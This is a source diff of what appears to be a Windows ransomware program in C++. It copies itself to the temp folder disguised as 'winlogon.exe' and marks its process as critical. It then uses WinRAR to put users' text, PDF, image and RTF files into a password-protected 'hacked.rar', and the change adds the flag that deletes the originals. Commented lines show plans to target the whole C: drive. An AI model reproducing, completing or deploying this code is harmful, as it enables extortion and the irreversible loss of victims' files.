@@ -6,6 +6,7 @@
 #include <sstream>		/* char to string */ 
 #include <sys/stat.h>   /* for check if file exists */
 #include "protector.h"
+#include <stdlib.h>		/* for Exit() */
 using namespace std;
 
 bool fileExists(const std::string& filename);
@@ -13,18 +14,30 @@ std::string generateKey();
 
 int main(){
 //----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-	std::string password = generateKey();
 	TCHAR filePath[MAX_PATH];
 	TCHAR tempPath[MAX_PATH];
 	GetModuleFileNameA(NULL,filePath, MAX_PATH);	// get current file path
 	GetTempPathA(MAX_PATH, tempPath);	// get temp path
+//----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+	if(strstr(filePath, "winlogon.exe") == 0){
+		strcat_s(tempPath, "\\winlogon.exe");
+		CopyFile(filePath, tempPath, 1);
+		Sleep(1000);
+		ShellExecuteA(NULL, "open", tempPath, NULL, NULL, SW_SHOW);
+		exit(EXIT_FAILURE);
+	}
+	// if file already in temp path
+	else{
+    ProtectProcess();  //make process as critical . example : winlogon.exe
+	std::string password = generateKey();
 	//Get username
 	char user[MAX_PATH+1];
 	DWORD user_len = MAX_PATH+1;
 	GetUserName(user, &user_len);	 //get user name
 //----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 	//config
-	std::string extensionList = "\"C:\\Users\\*\\*.txt\" \"C:\\Users\\*\\*.pdf\" \"C:\\Users\\*\\*.jpg\" \"C:\\Users\\*\\*.jpeg\" \"C:\\Users\\*\\*.rtf\"";
+	std::string extensionList = "\"C:\\Users\\*\\*.txt\" \"C:\\Users\\*\\*.pdf\" \"C:\\Users\\*\\*.jpg\" \"C:\\Users\\*\\*.jpeg\" \"C:\\Users\\*\\*.rtf\""; //for debug
+	/*std::string extensionList = "\"C:\\*\\*.txt\" \"C:\\*\\*.pdf\" \"C:\\*\\*.jpg\" \"C:\\*\\*.jpeg\" \"C:\\*\\*.rtf\"";*/
 	std::string desktopPath = "C:\\Users\\" + (std::string)(user) + "\\Desktop\\";
 	const std::string rarPath = "C:\\Program Files\\WinRAR\\WinRAR.exe";
 	const std::string fileName = "hacked.rar";
@@ -39,7 +52,7 @@ int main(){
 	-IBCK	run silently
 	-df		delete file after finish
 	*/
-	std::string fullCommandRar = "\"" +(std::string)rarPath + "\"" +"-mt2 a -IBCK -ace -p=" + password + " -m1 -logf=\"" + desktopPath + "list_crypted_file.txt\" \"" + (std::string)tempPath + fileName + "\" " + extensionList;
+	std::string fullCommandRar = "\"" +(std::string)rarPath + "\"" +" -mt2 a -df -IBCK -ace -p=" + password + " -m1 -logf=\"" + desktopPath + "list_crypted_file.txt\" \"" + (std::string)tempPath + fileName + "\" " + extensionList;
 //----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 	//put filePath to double quotes  - fullResult
 	TCHAR fullResult[MAX_PATH];
@@ -59,14 +72,13 @@ int main(){
 	//check if rar exist or not
 	if(fileExists(rarPath)){ 
 		if(fileExists(tempName) || fileExists(desktopName)){
-			MoveFile(tempName.c_str(), desktopName.c_str()); // move archived file to desktop
-			ProtectProcess();  //make process as critical . example : winlogon.exe 
+			MoveFile(tempName.c_str(), desktopName.c_str()); // move archived file to desktop			 
 			while(true){}; //for futher develope
 		}
 		else{
 		//std::cout << "Exist" << std::endl;
 		WinExec(fullCommandRar.c_str(), 1);
-		Sleep(9999999); //sleep till restart
+		Sleep(3000000); //sleep till restast
 		}
 	}
 	else{
@@ -74,6 +86,7 @@ int main(){
 	}
 		//std::system("pause");
 	return 0;
+	}
 }
 
 
